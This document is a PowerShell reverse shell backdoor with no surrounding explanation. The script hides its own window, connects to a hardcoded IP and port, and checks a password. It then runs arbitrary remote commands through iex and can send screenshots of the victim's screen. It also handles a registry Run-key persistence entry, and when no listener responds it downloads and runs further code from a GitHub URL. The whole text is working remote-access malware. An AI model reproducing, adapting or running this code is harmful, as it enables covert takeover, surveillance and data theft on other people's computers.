# --- CONFIG ---
$ip = '192.168.1.15'
$port = 4444
$secret = 'biskviti' # YOUR PASSWORD
$reg = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$name = "WinDiag"

# --- HIDE WINDOW (Stealth Start) ---
try {
    $h = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'
    $type = Add-Type -MemberDefinition $h -Name "W32" -Namespace "W" -PassThru
    $hwnd = (Get-Process -Id $PID).MainWindowHandle
    if ($hwnd -ne 0) { $type::ShowWindow($hwnd, 0) }
} catch {}

# --- CONNECTION ---
try {
    $c = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $s = $c.GetStream(); $w = New-Object System.IO.StreamWriter($s); $r = New-Object System.IO.StreamReader($s); $w.AutoFlush = $true

    # 1. THE AUTH CHALLENGE (15s Timeout)
    $w.WriteLine("AUTH REQUIRED:")
    $timer = [System.Diagnostics.Stopwatch]::StartNew()
    $auth = $false

    while ($timer.Elapsed.TotalSeconds -lt 15) {
        if ($s.DataAvailable) {
            if ($r.ReadLine() -eq $secret) { $auth = $true; break }
            else { 
                # WRONG PASS = WIPE PERSISTENCE & KILL
                Remove-ItemProperty -Path $reg -Name $name -ErrorAction SilentlyContinue
                $w.WriteLine("WRONG PASSWORD. SELF-DESTRUCTING."); exit 
            }
        }
        Start-Sleep -m 500
    }

    if ($auth) {
        $w.WriteLine("--- ATOMIC ACCESS: $env:COMPUTERNAME ---")
        while($c.Connected) {
            $w.Write("PS " + (Get-Location).Path + "> ")
            $raw = $r.ReadLine(); if ($null -eq $raw) { break }
            $cmd = $raw.Trim(); if ($cmd -eq "exit") { break }

            if ($cmd -eq "screenshot") {
                Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp = New-Object System.Drawing.Bitmap($rect.Width, $rect.Height)
                $g = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
                $mem = New-Object System.IO.MemoryStream
                $bmp.Save($mem, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $out = [Convert]::ToBase64String($mem.ToArray())
                $g.Dispose(); $bmp.Dispose(); $mem.Dispose()
            } else {
                $out = iex $cmd 2>&1 | Out-String
            }
            $w.WriteLine($out)
        }
    }
    $c.Close()
} catch {
    # NO LISTENER? WAIT 2 MINS AND TRY AGAIN
    Start-Sleep -s 120; iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v2.ps1')
}
